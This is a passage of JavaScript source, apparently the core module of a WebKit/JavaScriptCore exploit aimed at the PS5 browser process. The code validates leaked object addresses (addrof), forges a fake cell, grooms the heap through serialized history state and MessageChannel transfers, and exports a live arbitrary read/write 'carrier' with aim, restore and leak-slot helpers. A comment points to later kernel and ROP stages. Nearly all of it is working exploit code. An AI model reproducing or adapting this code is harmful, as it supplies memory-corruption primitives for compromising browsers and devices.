        keepAlive[keepIndex++] = predecessor;
        emit("PREDECESSOR-FILLED", `qwords=${PREDECESSOR_SIZE / 8}`
            + `-fake=${hex(fakeAddress)}`);

        criticalBarrier(fakeAddress, targetAddress);

        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2,
            earlyHole, finalHole]);
        loadHistoryCritical();
    } catch (error) {
        try { clearPredecessor(); } catch {}
        retrySafe = true;
        compositionError = error;
        compositionState = -1;
    }
    reportComposition();
}

let barrierNode = null;

function ensureBarrierNode() {
    if (barrierNode !== null)
        return;
    try {
        barrierNode = document.createElement("div");
        barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
        document.body.appendChild(barrierNode);
    } catch { barrierNode = null; }
}

function defaultCriticalBarrier(fake, target) {
    try {
        const line = `CRITICAL-LOAD-NEXT-fake=${hex(fake)}-target=${hex(target)}`;
        if (barrierNode !== null) {
            barrierNode.textContent = line;
            void barrierNode.offsetWidth;
        }
        void new Blob([line], { type: "text/plain" });

        try { sessionStorage.setItem(burstKey, line); } catch { }
    } catch { }
}

function beginComposition() {
    if (captureState === 0) {
        finishEarlySafeAttempt("ADDROF-NO-RESULT",
            "capture-task-did-not-finish", "addrof-no-result");
        return;
    }
    if (captureState < 0) {
        finishEarlySafeAttempt("ADDROF-THREW",
            `${captureError?.name}:`
            + String(captureError?.message).slice(0, 80),
            "addrof-threw");
        return;
    }

    const a0 = pointerFromWords(capturedWords, 0);
    const b0 = pointerFromWords(capturedWords, 4);
    const a1 = pointerFromWords(capturedWords, 8);
    const b1 = pointerFromWords(capturedWords, 12);
    const repeated = a0 === a1 && b0 === b1;
    const distinct = a0 !== b0;
    const plausible = plausibleCell(a0) && plausibleCell(b0)
        && plausibleCell(a1) && plausibleCell(b1);
    const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
    const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;

    emit("ADDROF-RETURNED", REVISION);
    emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
    emit("ADDROF-POINTERS", `HOST=${hex(a0)}-TARGET=${hex(b0)}`
        + `-HOST2=${hex(a1)}-TARGET2=${hex(b1)}`);

    if (!(repeated && distinct && plausible && sourceCovered)) {
        finishEarlySafeAttempt("ADDROF-FAIL",
            `repeat=${repeated}-distinct=${distinct}`
            + `-plausible=${plausible}-covered=${sourceCovered}`,
            "addrof-validation");
        return;
    }

    hostAddress = a0;
    targetAddress = b0;
    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff
        || targetAddressLow < 0 || targetAddressLow > 0xffffffff
        || Math.floor(targetAddressLow) !== targetAddressLow
        || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
        finishEarlySafeAttempt("TARGET-ADDRESS-FAIL",
            `target=${hex(targetAddress)}`, "target-address");
        return;
    }

    fakeAddress = hostAddress + 0x10;
    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
        finishEarlySafeAttempt("FAKE-ADDRESS-FAIL",
            `host=${hex(hostAddress)}`, "fake-address");
        return;
    }
    emit("FAKE-ADDRESS", `host=${hex(hostAddress)}-fake=${hex(fakeAddress)}`
        + "-delta=0x10");
    runGroomAndLoad();
}

function reportComposition() {
    if (compositionState < 0) {
        emit(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
            `${compositionError?.name}:`
            + String(compositionError?.message).slice(0, 80));
        if (!retrySafe)
            failed();
        else
            scheduleSafeRetry("placement-throw");
        return;
    }

    if (compositionState === 2) {
        emit("NORMAL-CLONE-MISS", "known-reference-returned=true");
        scheduleSafeRetry("normal-clone-miss");
        return;
    }

    if (compositionState === 3) {
        emit(identityResult === -1 ? "CARRIER-IDENTITY-FAIL"
            : (zeroHeaderMiss ? "ZERO-HEADER-MISS"
                : (retrySafe ? "COMPOSITION-LENGTH-MISS"
                    : "VALIDATION-MISMATCH")),
            `rw=${rwHeaderOK}-holder=${holderHeaderOK}`
            + `-function=${functionHeaderOK}`
            + `-native-executable=${nativeExecutableHeaderOK}`
            + `-repeat=${pointersRepeated}-retry-safe=${retrySafe}`
            + `-identity=${identityResult}`
            + `-hex=${dumpHex(rwHeader, CELL_BYTES)}`);
        if (!retrySafe)
            failed();
        else
            scheduleSafeRetry(zeroHeaderMiss
                ? "zero-header-miss" : "composition-length-mismatch");
        return;
    }

    if (compositionState === 0) {
        emit("NO-RESULT", "critical-load-did-not-finish");
        failed();
        return;
    }

    emit("SSV-RETURNED-CLEARED", `length=${compositionLength}`
        + "-predecessor-cleared=true");
    emit("RW-CARRIER", `sid=${hex(profile.carrierSID)}`
        + `-vector=${hex(rwOriginalVector)}`
        + `-length=${hex(uint32At(rwHeader, 0x18))}`
        + `-mode=${hex(profile.carrierMode)}`);
    emit("HOLDER", `cell=${hex(targetAddress)}`
        + `-textarea=${hex(anchorElementAddress)}`
        + `-markerA=${hex(markerAAddress)}-markerB=${hex(markerBAddress)}`);
    emit("JSC-PROFILE", `u8=${hex(profile.carrierType)}`
        + `-u8flags=${hex(profile.carrierFlags)}`
        + `-mode=${hex(profile.carrierMode)}`
        + `-obj=${hex(profile.holderType)}`
        + `-objflags=${hex(profile.holderFlags)}`
        + `-fn=${hex(profile.functionType)}`
        + `-fnflags=${hex(profile.functionFlags)}`
        + `-nx=${hex(profile.nativeExecType)}`
        + `-nxflags=${hex(profile.nativeExecFlags)}`);
    emit("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));

    const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK
        && nativeExecutableHeaderOK && pointersRepeated && restoreObserved
        && compositionLength === EXPECTED_LENGTH
        && liveCandidate !== null;

    if (!leakPass) {
        emit("READ-PRIMITIVE-MISMATCH", `rw=${rwHeaderOK}`
            + `-holder=${holderHeaderOK}-function=${functionHeaderOK}`
            + `-native=${nativeExecutableHeaderOK}`
            + `-repeat=${pointersRepeated}-restore=${restoreObserved}`);

        liveCandidate = null;
        failed();
        return;
    }

    emit("READ-PRIMITIVE-PASS", "arbitrary-read-established"
        + "-firmware-offsets-asserted=none");

    try { history.replaceState(null, ""); } catch { }

    stopped = true;
    running = false;
    const resolve = settleResolve;
    settleResolve = null;
    settleReject = null;
    if (resolve !== null)
        resolve(buildCarrier());
}

function buildCarrier() {

    profile.cellSize = 0x20;

    return {

        aim(address) {

            if (liveCandidate === null)
                throw new Error("core.aim: carrier is no longer live");
            if (!plausibleAddress(address))
                throw new RangeError(`core.aim: implausible address ${address}`);
            aimCarrier(liveCandidate, address);
        },
        restore() {
            if (liveCandidate === null)
                throw new Error("core.restore: carrier is no longer live");
            restoreCarrier(liveCandidate);
        },

        get view() { return rwView; },
        windowBytes: RW_BUFFER_SIZE,

        holder: targetHolder,
        holderAddress: targetAddress,
        leakSlotOffset: LEAK_SLOT_OFFSET,
        leakSlotAddress: targetAddress + LEAK_SLOT_OFFSET,
        setLeakSlot(value) { targetHolder.q2 = value; },
        clearLeakSlot() { targetHolder.q2 = markerObjectA; },

        anchorObject: markerObjectA,
        anchorObjectAddress: markerAAddress,
        textarea: anchorElement,
        textareaAddress: anchorElementAddress,

        profile,
        attempts: attemptNumber,
        validate: plausibleAddress,

        hostAddress,
        fakeAddress,

        assertHome() {
            if (liveCandidate === null || rwView === null || targetView === null
                || rwMirror === null)
                return false;
            return rwView[0] === 0x3c && rwMirror[0] === 0x3c
                && targetView[0] === 0xa5;
        }
    };
}

export function establishPrimitive(options) {
    const opts = options || {};

    if (fakeReleased)
        return Promise.reject(new Error(
            "core: the fake cell has been released to the real-cell pair -- "
            + "establishPrimitive cannot run again in this page"));
    if (running)
        return Promise.reject(new Error("core: already running"));
    if (typeof BigInt !== "function" || typeof MessageChannel !== "function"
        || typeof Symbol !== "function" || typeof history === "undefined"
        || typeof history.replaceState !== "function")
        return Promise.reject(new Error("core: unsupported browser"));

    onEvent = typeof opts.onEvent === "function" ? opts.onEvent : null;
    criticalBarrier = typeof opts.beforeCriticalLoad === "function"
        ? opts.beforeCriticalLoad : defaultCriticalBarrier;

    if (criticalBarrier === defaultCriticalBarrier)
        ensureBarrierNode();
    attemptCeiling = typeof opts.maxAttempts === "number" && opts.maxAttempts > 0
        ? opts.maxAttempts : 0;

    running = true;
    stopped = false;
    attemptNumber = 1;
    try { sessionStorage.removeItem(attemptKey); } catch { }

    return new Promise((resolve, reject) => {
        settleResolve = resolve;
        settleReject = reject;
        startAttempt();
    });
}

export function currentCarrier() {
    return liveCandidate === null ? null : buildCarrier();
}

const RELEASED_BINDINGS = [
    "liveCandidate", "fakeHost", "lengthWord",
    "getterCarrier", "leakedScope", "preparedSymbolObject",
    "capturedString", "capturedWords",
    "predecessorWords", "outerGraph", "fillerGraph", "referenceTarget",
    "keepAlive"
];

export function releaseFakeCell() {
    const report = {
        released: RELEASED_BINDINGS.slice(),
        alreadyReleased: fakeReleased,
        hostAddress,
        fakeAddress,
        historyCleared: false
    };
    if (fakeReleased)
        return report;

    liveCandidate = null;
    fakeHost = null;
    lengthWord = null;

    getterCarrier = null;
    leakedScope = null;
    preparedSymbolObject = null;

    capturedString = null;
    capturedWords = null;

    predecessorWords = null;
    outerGraph = null;
    fillerGraph = null;
    referenceTarget = null;
    keepAlive = null;

    // The serialized exploit graph otherwise remains owned by the current
    // history entry after all JavaScript bindings are dropped.  It is no
    // longer needed once mem.js has promoted the primitive to the real-cell
    // pair, and retaining it can push the PS5 WebProcess over its heap limit
    // when the kernel stages begin allocating their worker/ROP arenas.
    try {
        history.replaceState(null, "");
        report.historyCleared = history.state === null;
    } catch (_) { }

    fakeReleased = true;
    stopped = true;
    running = false;

    retryScheduled = false;
    return report;
}

export function fakeCellReleased() {
    return fakeReleased;
}

export function carrierHeaderCopy() {
    return rwHeader.slice(0, CELL_BYTES);
}

export function carrierHomeVector() {
    return rwOriginalVector;
}

export { profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell };
